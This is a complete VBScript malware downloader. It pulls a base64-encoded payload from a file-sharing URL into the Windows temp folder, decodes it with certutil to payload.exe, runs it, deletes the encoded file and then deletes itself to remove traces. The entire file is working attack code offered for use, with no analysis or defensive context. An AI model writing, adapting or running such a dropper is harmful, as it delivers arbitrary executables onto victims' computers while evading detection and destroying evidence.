Option Explicit

Dim url, filePath, tempFolder, fullFilePath, http, fso, fileStream, objShell
Dim command, scriptPath

url = "https://oshi.at/MqVb" ' direct-url to payload
tempFolder = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
filePath = tempFolder & "\payload.tmp"
fullFilePath = tempFolder & "\payload.exe"
scriptPath = WScript.ScriptFullName ' Path to the script itself

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set fileStream = fso.CreateTextFile(filePath, True)

    ' download base64 encoded payload    
    fileStream.Write http.responseText
    fileStream.Close

    ' Decode the payload using certutil
    command = "certutil -decode " & Chr(34) & filePath & Chr(34) & " " & Chr(34) & fullFilePath & Chr(34)
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run command, 0, True ' Wait until decoding operation completes

    ' execute decoded payload
    objShell.Run fullFilePath, 1, True ' Wait until payload.exe completes

    ' delete the .tmp encoded payload
    fso.DeleteFile filePath

Else
    ' download failure
End If

' clean up vb objects
If Not fileStream Is Nothing Then Set fileStream = Nothing
If Not fso Is Nothing Then Set fso = Nothing
If Not objShell Is Nothing Then Set objShell = Nothing
If Not http Is Nothing Then Set http = Nothing

' melt / self-destruct vbscript downloader
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c del " & Chr(34) & scriptPath & Chr(34), 0, False
